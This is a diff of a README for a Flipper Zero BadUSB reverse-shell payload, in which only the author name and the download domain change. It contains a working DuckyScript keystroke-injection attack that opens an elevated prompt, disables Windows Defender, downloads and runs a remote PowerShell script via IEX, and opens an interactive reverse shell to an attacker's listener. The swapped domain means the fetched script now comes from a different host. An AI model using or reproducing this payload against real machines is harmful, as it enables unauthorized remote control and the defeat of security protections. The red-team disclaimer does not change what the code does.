@@ -1,6 +1,6 @@
 # Admin Reverse Shell Payload for Flipper Zero
 
-Author: [SoggyCow](https://github.com/SoggyCow)  
+Author: [CayleRose](https://github.com/CayleRose)  
 License: MIT
 
 ## Overview
@@ -28,7 +28,7 @@ Before deployment, replace the following placeholders in the payload:
 - Example payload:
   ```ducky
   REM Title: Admin Reverse Shell Payload
-  REM Author: SoggyCow
+  REM Author: CayleRose
   REM Description: Opens elevated CMD via Task Manager, disables Windows Defender, and runs hidden PowerShell reverse shell
   DELAY 1000
   GUI t
@@ -36,7 +36,7 @@ Before deployment, replace the following placeholders in the payload:
   STRING taskmgr
   CTRL-SHIFT ENTER
   DELAY 1500
-  STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR 'https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1' -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]
+  STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR 'https://ps1.CayleRose.com/remote-access/Invoke-ConPtyShell.ps1' -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]
   ENTER
   ```
 
@@ -71,11 +71,11 @@ The script will:
 - **Reverse Shell**: Utilizes `Invoke-ConPtyShell` for a stable, interactive shell.
 - **Delays**: Uses `DELAY 1000`, `DELAY 500`, and `DELAY 1500`. Adjust for slower systems (e.g., `DELAY 700+`).
 - **Testing**: Validate in a virtual machine or sandbox to ensure functionality.
-- **Security**: Downloads a remote script from `https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1`. Verify the source before deployment.
+- **Security**: Downloads a remote script from `https://ps1.CayleRose.com/remote-access/Invoke-ConPtyShell.ps1`. Verify the source before deployment.
 
 ## Disclaimer
 
-This script is for **educational and authorized red team purposes only**. Use only on systems you own or have explicit permission to access. The author, SoggyCow, is not liable for misuse, damage, or legal consequences.
+This script is for **educational and authorized red team purposes only**. Use only on systems you own or have explicit permission to access. The author, CayleRose, is not liable for misuse, damage, or legal consequences.
 
 ## License
 
